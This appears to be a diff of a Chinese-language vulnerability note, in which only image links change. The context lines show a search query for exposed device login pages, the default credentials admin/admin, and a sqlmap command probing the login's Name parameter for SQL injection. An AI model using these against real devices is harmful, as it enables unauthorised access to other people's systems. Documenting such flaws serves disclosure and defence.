@@ -22,11 +22,11 @@ body="src="img/dl.gif"" && title="系统登录"
 
 
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140923586.png)
+![](./images/202202140923586.png)
 
 设备存在默认弱口令 **admin/admin**
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140924953.png)
+![](./images/202202140924953.png)
 
 登录的请求包为
 
@@ -53,6 +53,6 @@ Name=admin&Pass=admin
 sqlmap -r sql-1.txt -p Name --risk 3
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202140924004.png)
+![](./images/202202140924004.png)
 
 #
